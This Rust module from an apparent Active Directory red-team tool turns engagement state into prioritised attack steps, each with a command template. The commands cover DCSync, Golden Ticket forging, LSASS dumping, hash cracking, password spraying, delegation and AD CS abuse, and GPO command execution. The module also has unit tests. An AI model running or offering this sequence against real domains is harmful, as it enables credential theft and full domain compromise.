//! Killchain advisor -- turn engagement state into concrete next steps.
//!
//! The TUI wizard and the auto-pwn runner both accumulate an
//! [`EngagementState`](crate::goals::EngagementState) as they work. That state, plus the list of
//! modules the operator actually ran, is enough to answer the question operators
//! ask after every stage: *"what now?"*
//!
//! [`advise`] is a pure function over those two inputs. It deliberately does not
//! touch the network, so it is cheap to call after every stage and trivial to
//! test. Each [`NextStep`] carries a ready-to-run command so the operator can act
//! on it without re-deriving the syntax.

use crate::goals::EngagementState;
use serde::{Deserialize, Serialize};

/// A module or technique the operator already ran.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CompletedAction {
    /// Human-readable module name, e.g. "Kerberoast (RC4/AES)".
    pub name: String,
    /// Whether the module reported success.
    pub success: bool,
    /// Short result summary (counts, hostnames, error text).
    pub detail: String,
}

impl CompletedAction {
    /// Convenience constructor.
    pub fn new(name: impl Into<String>, success: bool, detail: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            success,
            detail: detail.into(),
        }
    }
}

/// One recommended next step in the killchain.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NextStep {
    /// Lower sorts first. 1 = do this now, 5 = housekeeping.
    pub priority: u8,
    /// Short imperative title.
    pub title: String,
    /// Why this is the recommended step, grounded in the state we have.
    pub rationale: String,
    /// Ready-to-run command (may be a template with the known DC/domain filled in).
    pub command: String,
    /// Technique class this belongs to (credential-access, lateral, persistence...).
    pub technique: String,
}

impl NextStep {
    fn new(
        priority: u8,
        technique: &str,
        title: impl Into<String>,
        rationale: impl Into<String>,
        command: impl Into<String>,
    ) -> Self {
        Self {
            priority,
            technique: technique.to_string(),
            title: title.into(),
            rationale: rationale.into(),
            command: command.into(),
        }
    }
}

/// Build a `--dc-host`/`--domain`/credential suffix for generated commands.
fn target_args(state: &EngagementState) -> String {
    let dc = state.dc_ip.as_deref().unwrap_or("<DC_IP>");
    let domain = state.domain.as_deref().unwrap_or("<domain>");
    format!("--dc-host {dc} -d {domain}")
}

/// Recommend the next steps given what we know and what we already ran.
///
/// The returned list is sorted by [`NextStep::priority`]; when the engagement
/// already reached Domain Admin the list collapses to loot/persistence/cleanup.
pub fn advise(state: &EngagementState, done: &[CompletedAction]) -> Vec<NextStep> {
    let mut steps: Vec<NextStep> = Vec::new();
    let t = target_args(state);

    let did = |needle: &str| done.iter().any(|d| d.name.contains(needle));
    let failed = |needle: &str| done.iter().any(|d| d.name.contains(needle) && !d.success);

    // ---- Reached the objective: consolidate rather than keep attacking ----
    if state.has_domain_admin {
        let who = state
            .da_user
            .as_deref()
            .unwrap_or("the compromised account");
        steps.push(NextStep::new(
            1,
            "impact",
            "Dump NTDS.dit and preserve domain-wide credentials",
            format!(
                "{who} holds Domain Admin-equivalent rights, so a full replication dump \
                 is now available. Store the output offline -- krbtgt is what makes the \
                 Golden Ticket (and the cleanup) possible."
            ),
            format!("ovt dcsync {t} --all --output-dir ./loot"),
        ));
        steps.push(NextStep::new(
            2,
            "persistence",
            "Forge a Golden Ticket for offline re-entry",
            "With the krbtgt key dumped, a Golden Ticket survives password resets of \
             every other account, which makes it the standard persistence proof in a \
             lab report."
                .to_string(),
            format!("ovt forge golden {t} --krbtgt-hash <krbtgt_nt> --impersonate Administrator"),
        ));
        steps.push(NextStep::new(
            3,
            "cleanup",
            "Restore the accounts you changed",
            "ResetNightmare / password-reset techniques and shadow credentials are the \
             main changes that break a lab for the next run. Revert them while you still \
             have the access to do so."
                .to_string(),
            "ovt shadow-cred clear <target>   # then reset any passwords you changed".to_string(),
        ));
        return sorted(steps);
    }

    // ---- Nothing enumerated yet ----
    if state.users.is_empty() && state.computers.is_empty() {
        steps.push(NextStep::new(
            1,
            "discovery",
            "Enumerate the domain before anything else",
            "No users or computers are known, so every later stage would be guessing. \
             Run a full LDAP/BloodHound enumeration first."
                .to_string(),
            format!("ovt enum all {t} -u <user> -p <password>"),
        ));
        return sorted(steps);
    }

    // ---- Credential access ----
    if !state.roast_hashes.is_empty() && state.cracked.is_empty() {
        steps.push(NextStep::new(
            1,
            "credential-access",
            "Crack the roasted hashes",
            format!(
                "{} roastable hash(es) were captured but none are cracked yet. \
                 Kerberoast output is mode 13100; AS-REP is 18200. Offline cracking is \
                 the quietest way to convert these into usable credentials.",
                state.roast_hashes.len()
            ),
            "hashcat -m 13100 --optimized-kernel-enable ./loot/roast.txt <wordlist>".to_string(),
        ));
    }

    if !state.cracked.is_empty() && !state.credentials.is_empty() {
        for (user, plaintext) in state.cracked.iter().take(3) {
            steps.push(NextStep::new(
                2,
                "credential-access",
                format!("Verify and reuse cracked credential '{user}'"),
                "A cracked hash may unlock more than the account it came from -- test it \
                 for local-admin reuse across the discovered hosts before moving on."
                    .to_string(),
                format!("ovt smb --targets ./loot/hosts.txt -u {user} -p {plaintext}"),
            ));
        }
    }

    if state.credentials.is_empty() && !state.admin_hosts.is_empty() {
        steps.push(NextStep::new(
            2,
            "credential-access",
            "Harvest credentials from the hosts you already administer",
            format!(
                "Admin access is confirmed on {} host(s) but no credentials are stored. \
                 LSASS/SAM dumps from those hosts are the fastest way to grow the \
                 credential set.",
                state.admin_hosts.len()
            ),
            "ovt dump-lsass --targets ./loot/admin_hosts.txt".to_string(),
        ));
    }

    // ---- Delegation abuse ----
    if !state.unconstrained_delegation.is_empty() {
        steps.push(NextStep::new(
            2,
            "lateral",
            "Coerce a DC authentication onto an unconstrained-delegation host",
            format!(
                "{} host(s) hold unconstrained delegation. Any DC that authenticates to \
                 them leaves a usable TGT in memory, which is a direct path to DCSync.",
                state.unconstrained_delegation.len()
            ),
            format!(
                "ovt ntlm capture --auto-coerce-target {} , then dump LSASS",
                state.unconstrained_delegation[0]
            ),
        ));
    }
    if !state.rbcd_targets.is_empty() {
        steps.push(NextStep::new(
            2,
            "lateral",
            "Configure RBCD on a writable machine account",
            format!(
                "{} RBCD-capable target(s) found. RBCD needs write access to the target's \
                 msDS-AllowedToActOnBehalfOfOtherIdentity, then an S4U2Proxy ticket.",
                state.rbcd_targets.len()
            ),
            format!("ovt rbcd configure --target {} {t}", state.rbcd_targets[0]),
        ));
    }
    if !state.constrained_delegation.is_empty() {
        steps.push(NextStep::new(
            3,
            "lateral",
            "Abuse constrained delegation to reach a Tier-0 service",
            format!(
                "{} account(s) have constrained delegation configured.",
                state.constrained_delegation.len()
            ),
            "ovt kerberos s4u2proxy --impersonate Administrator --spn <target_spn>".to_string(),
        ));
    }

    // ---- Privilege escalation from admin access ----
    if !state.admin_hosts.is_empty() {
        steps.push(NextStep::new(
            3,
            "privilege-escalation",
            "DCSync from the host where you hold admin rights",
            "Replicating Directory Changes is the normal escalation from local admin on a \
             DC, or from an account with the replication extended right. Run it from the \
             host you already control so the traffic is sourced internally."
                .to_string(),
            format!("ovt dcsync {t} -u <admin_user> -p <password> --user krbtgt"),
        ));
    }

    // ---- GPO / LAPS ----
    if !state.gpos.is_empty() {
        steps.push(NextStep::new(
            3,
            "privilege-escalation",
            "Check GPO write rights for a scheduled-task push",
            format!(
                "{} GPO(s) enumerated. A GPO you can write lets you execute as SYSTEM on \
                 every linked host, without touching LSASS.",
                state.gpos.len()
            ),
            format!(
                "ovt gpo write --gpo {} --command \"whoami\" {t}",
                state.gpos[0]
            ),
        ));
    }
    if !state.laps.is_empty() {
        steps.push(NextStep::new(
            3,
            "credential-access",
            "Read the LAPS passwords you can access",
            format!(
                "{} host(s) have readable LAPS passwords -- use them for local-admin \
                 lateral movement without cracking anything.",
                state.laps.len()
            ),
            format!("ovt powerview laps {t}"),
        ));
    }

    // ---- Spelling ----
    if state.password_policy.is_some() && state.credentials.is_empty() {
        steps.push(NextStep::new(
            4,
            "credential-access",
            "Spray only if the lockout policy allows it",
            "Password policy is known, so the lockout threshold decides whether spraying \
             is safe. Stay one attempt below the threshold and add jitter."
                .to_string(),
            format!("ovt spray {t} -U ./loot/users.txt -P 'Summer2026!' --jitter 2000"),
        ));
    }

    // ---- Adapt to what the operator already tried ----
    if failed("PSExec") || failed("SMBExec") {
        steps.push(NextStep::new(
            2,
            "execution",
            "Retry execution with a different transport",
            "A service-creation based method (PSExec/SMBExec) failed on this target. EDR \
             and hardened builds commonly block SCM/service creation while leaving WinRM \
             or scheduled tasks reachable."
                .to_string(),
            format!(
                "ovt exec winrm --target {} --command \"whoami /all\" {t}",
                state.dc_ip.as_deref().unwrap_or("<host>")
            ),
        ));
    }
    if failed("Kerberoast") {
        steps.push(NextStep::new(
            2,
            "credential-access",
            "Re-run Kerberoast with the RC4 downgrade and a fresh TGT",
            "Kerberoasting commonly fails because the cached TGT expired or the SPN \
             accounts only accept AES. Retry with a fresh TGT and the RC4 downgrade to \
             get a crackable hash."
                .to_string(),
            format!("ovt kerberos roast {t} -u <user> -p <password> --downgrade-rc4"),
        ));
    }
    if did("Certify Scan") || failed("Certify Scan") {
        steps.push(NextStep::new(
            3,
            "privilege-escalation",
            "Follow up the AD CS scan with the matching ESC template",
            "A template scan is only useful once you map the finding to an abuse path -- \
             ESC1 (enrollee-supplied SAN) and ESC8 (relay to web enrollment) are the two \
             that most often end in a DC certificate."
                .to_string(),
            "ovt adcs esc1 --ca <CA> --template <template>   # or: ovt ntlm adcs-relay".to_string(),
        ));
    }

    // ---- Fallback so the caller always has something actionable ----
    if steps.is_empty() {
        steps.push(NextStep::new(
            4,
            "discovery",
            "Broaden enumeration to find the next lead",
            "The current state has no obvious escalation path: no roastable accounts, no \
             delegation findings, and no confirmed admin access. Enumerate ACLs, trusts and \
             AD CS to find one."
                .to_string(),
            format!("ovt powerview acl {t} ; ovt enum trusts {t} ; ovt certify scan {t}"),
        ));
    }

    sorted(steps)
}

/// Sort by priority while keeping insertion order stable within a priority.
fn sorted(mut steps: Vec<NextStep>) -> Vec<NextStep> {
    steps.sort_by_key(|s| s.priority);
    steps
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::goals::{CompromisedCred, LapsInfo, PasswordPolicyInfo, SecretType};

    fn cred(user: &str) -> CompromisedCred {
        CompromisedCred {
            username: user.to_string(),
            secret: "hunter2".to_string(),
            secret_type: SecretType::Password,
            source: "test".to_string(),
            is_admin: false,
            admin_on: Vec::new(),
        }
    }

    fn state_with_dc() -> EngagementState {
        EngagementState {
            domain: Some("corp.local".into()),
            dc_ip: Some("10.0.0.10".into()),
            ..Default::default()
        }
    }

    #[test]
    fn empty_state_recommends_enumeration_first() {
        let steps = advise(&EngagementState::default(), &[]);
        assert_eq!(steps.len(), 1);
        assert_eq!(steps[0].priority, 1);
        assert!(steps[0].command.contains("ovt enum all"));
    }

    #[test]
    fn uncracked_roast_hashes_recommend_cracking() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        state.roast_hashes.push("$krb5tgs$23$*svc$...".into());
        let steps = advise(&state, &[]);
        let crack = steps
            .iter()
            .find(|s| s.command.contains("hashcat -m 13100"))
            .expect("cracking step");
        assert_eq!(crack.priority, 1);
        assert!(crack.rationale.contains("13100"));
    }

    #[test]
    fn cracked_credentials_are_suggested_for_reuse() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        state.roast_hashes.push("hash".into());
        state.cracked.insert("svc_sql".into(), "Summer2026!".into());
        state.credentials.insert("svc_sql".into(), cred("svc_sql"));
        let steps = advise(&state, &[]);
        let reuse = steps
            .iter()
            .find(|s| s.command.contains("Summer2026!"))
            .expect("reuse step");
        assert!(reuse.rationale.contains("local-admin reuse"));
    }

    #[test]
    fn unconstrained_delegation_recommends_coercion() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        state.unconstrained_delegation.push("WEB01".into());
        let steps = advise(&state, &[]);
        assert!(
            steps.iter().any(|s| s.title.contains("unconstrained")),
            "expected coercion step, got {steps:?}"
        );
    }

    #[test]
    fn admin_hosts_recommend_dcsync() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        state.admin_hosts.insert("DC01".into());
        let steps = advise(&state, &[]);
        let dcsync = steps
            .iter()
            .find(|s| s.command.contains("ovt dcsync"))
            .expect("dcsync step");
        assert_eq!(dcsync.priority, 3);
    }

    #[test]
    fn domain_admin_collapses_to_loot_persistence_cleanup() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        state.has_domain_admin = true;
        state.da_user = Some("Administrator".into());
        let steps = advise(&state, &[]);
        assert_eq!(steps.len(), 3);
        assert!(steps[0].command.contains("ovt dcsync"));
        assert!(steps[1].command.contains("ovt forge golden"));
        assert!(steps[2].technique == "cleanup");
    }

    #[test]
    fn failed_psexec_suggests_alternate_transport() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        let done = vec![CompletedAction::new(
            "PSExec",
            false,
            "service creation denied",
        )];
        let steps = advise(&state, &done);
        assert!(
            steps
                .iter()
                .any(|s| s.title.contains("different transport"))
        );
    }

    #[test]
    fn ceritfy_scan_triggers_esc_followup() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        let done = vec![CompletedAction::new("Certify Scan", true, "3 templates")];
        let steps = advise(&state, &done);
        assert!(steps.iter().any(|s| s.command.contains("ovt adcs esc1")));
    }

    #[test]
    fn locks_out_free_state_still_yields_a_step() {
        // A state with enumeration data but no leads must still return guidance.
        let mut state = state_with_dc();
        state.users.push(Default::default());
        let steps = advise(&state, &[]);
        assert!(!steps.is_empty());
        assert!(steps.iter().any(|s| s.priority == 4));
    }

    #[test]
    fn steps_are_sorted_by_priority() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        state.roast_hashes.push("h".into());
        state.admin_hosts.insert("DC01".into());
        state.gpos.push("Default Domain Policy".into());
        let steps = advise(&state, &[]);
        let priorities: Vec<u8> = steps.iter().map(|s| s.priority).collect();
        let mut sorted_p = priorities.clone();
        sorted_p.sort_unstable();
        assert_eq!(priorities, sorted_p);
    }

    #[test]
    fn laps_and_password_policy_produce_steps() {
        let mut state = state_with_dc();
        state.users.push(Default::default());
        state.laps.push(LapsInfo::default());
        state.password_policy = Some(PasswordPolicyInfo::default());
        let steps = advise(&state, &[]);
        assert!(steps.iter().any(|s| s.command.contains("powerview laps")));
        assert!(steps.iter().any(|s| s.command.contains("ovt spray")));
    }
}
